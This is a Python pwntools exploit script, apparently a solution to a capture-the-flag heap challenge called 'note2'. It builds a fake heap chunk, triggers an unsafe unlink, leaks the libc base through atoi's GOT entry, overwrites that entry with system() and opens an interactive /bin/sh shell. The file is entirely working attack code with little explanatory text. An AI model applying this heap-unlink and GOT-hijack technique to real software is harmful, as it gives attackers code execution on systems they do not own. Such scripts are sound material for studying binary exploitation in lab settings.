#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import pdb
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./note2") if sys.argv[1] == "l" else remote("127.0.0.1", 9999)
elf = ELF("./note2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def init():
    # pdb.set_trace()
    io.sendlineafter("name:\n", "M4x")
    io.sendlineafter("address:\n", "0000")

def new(length, content):
    io.sendlineafter("--->>\n", "1")
    io.sendlineafter("128)\n", str(length))
    io.sendlineafter("content:\n", content)
    
def show(idx):
    io.sendlineafter("--->>\n", "2")
    io.sendlineafter("note:\n", str(idx))

def edit(idx, content, overwrite = True):
    io.sendlineafter("--->>\n", "3")
    io.sendlineafter("note:\n", str(idx))
    overwrite = 1 if overwrite else 2
    io.sendlineafter("]\n", str(overwrite))
    io.sendlineafter("Contents:", content)

def delete(idx):
    io.sendlineafter("--->>\n", "4")
    io.sendlineafter("note:\n", str(idx))

if __name__ == "__main__":
    init()
    info("Step 1: create three chunks")
    # chunk 0: fake chunk
    ptr = 0x602120
    payload = 'a' * 8 + p64(0x61) + p64(ptr - 0x18) + p64(ptr - 0x10) + 'b' * 64 + p64(0x60)
    new(128, payload)

    # chunk 1: 0-size chunk
    new(0, 'c' * 8)

    # chunk 2: chunk to be freed
    new(128, 'd' * 16)

    info("Step 2: uaf and overwrite")
    delete(1)
    payload = 'e' * 16 + p64(0xa0) + p64(0x90)
    new(0, payload)
    # trigger unlink, ptr[0] = ptr - 0x18
    delete(2)

    info("Step 3: leak libc_base")
    payload = 'f' * 0x18 + p64(elf.got["atoi"])
    edit(0, payload)
    show(0)

    io.recvuntil("is ")
    libc_base = u64(io.recvuntil("\n", drop = True).ljust(8, "\x00")) - libc.symbols["atoi"]

    debug("libc_base -> 0x%x" % libc_base)
    system_addr = libc_base + libc.symbols["system"]

    info("Step 4: hijack atoi_got to system")
    edit(0, p64(system_addr))

    # get shell
    io.sendlineafter("--->>\n", "/bin/sh\0")
    io.interactive()
    io.close()
    


